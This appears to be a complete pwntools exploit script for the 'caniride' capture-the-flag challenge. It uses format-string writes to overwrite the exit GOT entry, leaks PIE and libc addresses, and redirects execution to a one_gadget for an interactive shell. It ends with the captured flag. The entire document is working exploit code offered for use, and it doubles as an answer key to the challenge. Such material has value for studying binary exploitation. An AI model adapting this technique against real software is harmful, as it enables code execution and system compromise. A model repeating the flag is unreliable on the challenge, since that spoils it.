from pwn import *
elf = ELF("caniride")
libc = ELF("libc.so.6")
context.log_level = "debug"

ip,port = "challs.actf.co", 31228

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def break_addr(address):
    shorts = []
    curr = 0
    for _ in range(4):
        num = address % 0x10000
        desired_value = (num - curr + 0x10000) % 0x10000
        shorts.append(desired_value)
        curr = (curr + desired_value) % 0x10000
        address = address >> 16
    return shorts

ru("Name: ")
fmt_payload = "%*20$x%16$hn"
fmt_payload += "%*21$x%17$hn"
fmt_payload += "%*22$x%18$hn" 
fmt_payload += "%*23$x%19$hn"
sl(fmt_payload)
ru("driver: ")
sl("-3")
leak_line = ru("yourself: ")

#Get pie leak
pie_leak = leak_line[12:leak_line.find(b" your driver")]
pie_leak = u64(pie_leak + b"\x00"*(8-len(pie_leak)))
#__dso_handle
print("Noicee" + hex(pie_leak))
pie_base = pie_leak - 0x1035a8
exit_got = pie_base + 0x103550
main_addr = pie_base + 0x101269


def break_addr(address):
    shorts = []
    curr = 0
    for _ in range(4):
        num = address % 0x10000
        desired_value = (num - curr + 0x10000) % 0x10000
        shorts.append(desired_value)
        curr = (curr + desired_value) % 0x10000
        address = address >> 16
    return shorts

buf_payload = p64(exit_got) + p64(exit_got + 2) + p64(exit_got + 4) + p64(exit_got + 6)
shorts = break_addr(main_addr)
buf_payload += p64(shorts[0]) + p64(shorts[1]) + p64(shorts[2]) + p64(shorts[3])
sl(buf_payload)


ru("Name: ")
fmt_leak_payload = "%16$s"
sl(fmt_leak_payload)
ru("driver: ")
sl("0")
ru("yourself: ")
printf_got = pie_base + 0x103528
buf_leak_payload = p64(printf_got)
sl(buf_leak_payload)
leak_line = ru("Name: ")
libc_leak = leak_line[leak_line.find(b"Bye, ")+5:leak_line.find(b"!\nWelc")]
printf_addr = u64(libc_leak + b"\x00"*(8-len(libc_leak)))
libc_base = printf_addr - 0x61cc0

sl(fmt_payload)
ru("driver: ")
sl("0")
ru("yourself: ")
buf_payload = p64(exit_got) + p64(exit_got + 2) + p64(exit_got + 4) + p64(exit_got + 6)
one_gadget = libc_base + 0xe3b31
shorts = break_addr(one_gadget)
buf_payload += p64(shorts[0]) + p64(shorts[1]) + p64(shorts[2]) + p64(shorts[3])
sl(buf_payload)
i()
#actf{h0llerin'_at_y0u_from_a_1977_mont3_car1o_a6ececa9966d}